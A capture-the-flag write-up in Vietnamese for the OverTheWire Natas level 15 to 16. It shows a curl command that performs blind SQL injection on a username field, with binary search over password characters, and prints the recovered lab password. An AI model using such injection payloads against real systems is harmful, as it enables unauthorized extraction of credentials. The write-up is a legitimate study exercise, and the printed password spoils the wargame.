# Natas 15 → 16

## Mục tiêu

Lấy password của `natas16` bằng blind SQL injection.

## Tôi thấy

Response chỉ có `This user exists.` hoặc `This user doesn't exist.`. Trường `username` được đưa vào query.

## Cách làm

```bash
curl -u natas15:<password> -X POST \
  -d 'username=natas16" AND ASCII(SUBSTRING(password,1,1)) >= 77 #' \
  http://natas15.natas.labs.overthewire.org/
```

Thay đổi vị trí và giá trị ASCII, dùng response để binary-search từng ký tự.

## Vì sao cách này hiệu quả

Điều kiện SQL đúng làm response báo user tồn tại. Binary search giảm số request cần thiết so với thử toàn bộ ký tự.

## Kết quả

Password của `natas16`:

```text
Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
```

